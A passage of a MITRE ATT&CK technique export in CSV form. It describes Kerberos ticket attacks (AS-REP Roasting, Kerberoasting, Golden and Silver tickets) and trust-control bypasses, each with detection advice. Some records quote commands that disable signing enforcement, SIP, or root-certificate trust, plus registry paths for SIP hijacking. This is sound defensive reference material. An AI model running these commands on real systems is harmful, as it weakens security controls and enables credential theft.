Preauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014)

For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) 

An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",https://attack.mitre.org/techniques/T1558/004,24 August 2020,07 June 2021,enterprise-attack,1.0,Credential Access,"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: Microsoft 4768 TGT 2017)",Windows,Active Directory: Active Directory Credential Request,True,T1558,,"Dan Nutting, @KerberToast; Jacques Pluviose, @Jacqueswildy_IT; James Dunn, @jamdunnDFW, EY; Swapnil Kumbhar; Yossi Nisani, Cymptom",User,,Valid domain account,,,"(Citation: DFIR Ryuk's Return October 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: GitHub Rubeus March 2023),(Citation: Microsoft Preauthentication Jul 2012),(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019),(Citation: AdSecurity Cracking Kerberos Dec 2015)"
T1558.001,attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1,Steal or Forge Kerberos Tickets: Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) 

Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)

The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",https://attack.mitre.org/techniques/T1558/001,11 February 2020,05 November 2020,enterprise-attack,1.1,Credential Access,"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)

Monitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)

Monitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. 
",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Metadata",True,T1558,,"Itamar Mizrahi, Cymptom",User,,,,,"(Citation: NCC Group APT15 Alive and Strong),(Citation: GitHub Rubeus March 2023),(Citation: GitHub Mimikatz kerberos Module),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Github PowerShell Empire),(Citation: STIG krbtgt reset)"
T1558.003,attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee,Steal or Forge Kerberos Tickets: Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",https://attack.mitre.org/techniques/T1558/003,11 February 2020,30 March 2023,enterprise-attack,1.2,Credential Access,"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)",Windows,Active Directory: Active Directory Credential Request,True,T1558,,Praetorian,,,Valid domain account or the ability to sniff traffic within a domain,,,"(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Harmj0y Kerberoast Nov 2016),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: Mandiant FIN7 Apr 2022),(Citation: GitHub Rubeus March 2023),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Mandiant FIN12 Oct 2021),(Citation: PowerSploit Invoke Kerberoast),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Impacket Tools),(Citation: Github PowerShell Empire),(Citation: AdSecurity Cracking Kerberos Dec 2015)"
T1558.002,attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27,Steal or Forge Kerberos Tickets: Silver Ticket,"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)

Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",https://attack.mitre.org/techniques/T1558/002,11 February 2020,25 March 2020,enterprise-attack,1.0,Credential Access,"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) 

Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.",Windows,Logon Session: Logon Session Metadata,True,T1558,,,User,,,,,"(Citation: GitHub Mimikatz kerberos Module),(Citation: Github PowerShell Empire),(Citation: AADInternals Documentation),(Citation: GitHub Rubeus March 2023),(Citation: AdSecurity Cracking Kerberos Dec 2015)"
T1553.002,attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082,Subvert Trust Controls: Code Signing,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.

Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",https://attack.mitre.org/techniques/T1553/002,05 February 2020,22 September 2022,enterprise-attack,1.1,Defense Evasion,Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.,"Windows, macOS",File: File Metadata,True,T1553,Windows User Account Control,,,,,,,"(Citation: Cybereason TA505 April 2019),(Citation: FireEye Periscope March 2018),(Citation: FireEye CARBANAK June 2017),(Citation: Deep Instinct TA505 Apr 2019),(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky Winnti April 2013),(Citation: CISA AppleJeus Feb 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Medium Metamorfo Apr 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: FireEye APT41 Aug 2019),(Citation: Bitdefender StrongPity June 2020),(Citation: CrowdStrike Scattered Spider BYOVD January 2023),(Citation: Janicab),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: Unit 42 BackConfig May 2020),(Citation: Symantec Nerex May 2012),(Citation: Cybereason Kimsuky November 2020),(Citation: ClearSky OilRig Jan 2017),(Citation: FireEye FIN7 Oct 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Volexity Patchwork June 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Microsoft GALLIUM December 2019),(Citation: Kaspersky Darkhotel),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: ATT QakBot April 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: ESET Ebury Feb 2014),(Citation: ESET Gazer Aug 2017),(Citation: ThreatConnect Kimsuky September 2020),(Citation: McAfee Honeybee),(Citation: Kaspersky Turla),(Citation: Wired Lockergoga 2019),(Citation: Palo Alto menuPass Feb 2017),(Citation: Cybereason Bazar July 2020),(Citation: Symantec Tick Apr 2016),(Citation: Symantec Ukraine Wipers February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: ESET RTM Feb 2017),(Citation: FireEye Operation Molerats),(Citation: Check Point Black Basta October 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: FireEye APT40 March 2019),(Citation: JPCERT ChChes Feb 2017),(Citation: ESET PipeMon May 2020),(Citation: Unit42 Clop April 2021),(Citation: Lunghi Iron Tiger Linux),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Securelist WhiteBear Aug 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Group IB Silence Aug 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Symantec Suckfly March 2016),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Lazarus APT January 2022),(Citation: Trend Micro TA505 June 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Hermetic Wiper February 2022),(Citation: FireEye FIN7 Aug 2018),(Citation: Group IB APT 41 June 2021),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Securelist APT10 March 2021),"
T1553.006,attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c,Subvert Trust Controls: Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. 

Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)

Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)

To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",https://attack.mitre.org/techniques/T1553/006,23 April 2021,05 May 2022,enterprise-attack,1.0,Defense Evasion,"Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\Software\Policies\Microsoft\Windows NT\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare.","Windows, macOS","Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1553,"Application Control, Digital Certificate Validation, User Mode Signature Validation","Abel Morales, Exabeam",,,,,,"(Citation: Trend Micro Iron Tiger April 2021),(Citation: GitHub Turla Driver Loader),(Citation: FBI FLASH APT39 September 2020),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit42 AcidBox June 2020),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Microsoft TESTSIGNING Feb 2021)"
T1553.001,attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e,Subvert Trust Controls: Gatekeeper Bypass,"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )

Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:

1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)

2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.

3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.

4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.

Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)

Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",https://attack.mitre.org/techniques/T1553/001,05 February 2020,21 October 2022,enterprise-attack,1.2,Defense Evasion,"The removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the <code>com.apple.quarantine</code> flag when performing updates. 

Review <code>false</code> values under the <code>LSFileQuarantineEnabled</code> entry in an application's <code>Info.plist</code> file (required by every application). <code>false</code> under <code>LSFileQuarantineEnabled</code> indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified <code>LSFileQuarantineEnabled</code> entry will default to not setting the quarantine flag. 

QuarantineEvents is a SQLite database containing a list of all files assigned the <code>com.apple.quarantine</code> attribute, located at <code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.(Citation: TheEclecticLightCompany Quarantine and the flag)",macOS,"Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Creation",True,T1553,"Anti-virus, Application Control","Brandon Dalton @PartyD0lphin; Swasti Bhushan Deb, IBM India Pvt. Ltd.",,,,,,"(Citation: CoinTicker 2019),(Citation: Carbon Black Shlayer Feb 2019),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Application Bundle Manipulation Brandon Dalton),(Citation: ESET DazzleSpy Jan 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: Shlayer jamf gatekeeper bypass 2021),"
T1553.004,attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839,Subvert Trust Controls: Install Root Certificate,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)

Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)

Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)

In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",https://attack.mitre.org/techniques/T1553/004,21 February 2020,15 September 2023,enterprise-attack,1.2,Defense Evasion,"A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)

Installed root certificates are located in the Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and <code>[HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)

* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25
* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85
* 3B1EFD3A66EA28B16697394703A72CA340A05BD5
* 7F88CD7223F3C813818C994614A89C99FA3B5247
* 8F43288AD272F3103B6FB1428485EA3014C0BCFE
* A43489159A520F0D93D032CCAF37E7FE20A8B419
* BE36A4562FB2EE05DBB3D32323ADF445084ED656
* CDD4EEAE6000AC7F40C3802C171E30148030C072","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1553,Digital Certificate Validation,"Itzik Kotler, SafeBreach; Matt Graeber, @mattifestation, SpecterOps; Red Canary; Travis Smith, Tripwire",,,,,,"(Citation: Palo Alto Retefe),(Citation: hexed osx.dok analysis 2019),(Citation: objsee mac malware 2017),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Wikipedia HPKP),(Citation: SpectorOps Code Signing Dec 2017)"
T1553.005,attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961,Subvert Trust Controls: Mark-of-the-Web Bypass,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)

Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",https://attack.mitre.org/techniques/T1553/005,22 February 2021,22 March 2023,enterprise-attack,1.1,Defense Evasion,"Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.(Citation: Disable automount for ISO)",Windows,"File: File Creation, File: File Metadata",True,T1553,"Anti-virus, Application Control","Christiaan Beek, @ChristiaanBeek",,,,,,"(Citation: TrendMicro TA505 Aug 2019),(Citation: Trend Micro Black Basta October 2022),(Citation: Korean FSI TA505 2020),(Citation: ESET T3 Threat Report 2021),(Citation: GitHub MOTW),(Citation: Dormann Dangers of VHD 2019)"
T1553.003,attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc,Subvert Trust Controls: SIP and Trust Provider Hijacking,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)

Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).

Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",https://attack.mitre.org/techniques/T1553/003,05 February 2020,05 May 2022,enterprise-attack,1.0,Defense Evasion,"Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)

Enable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)

Utilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)

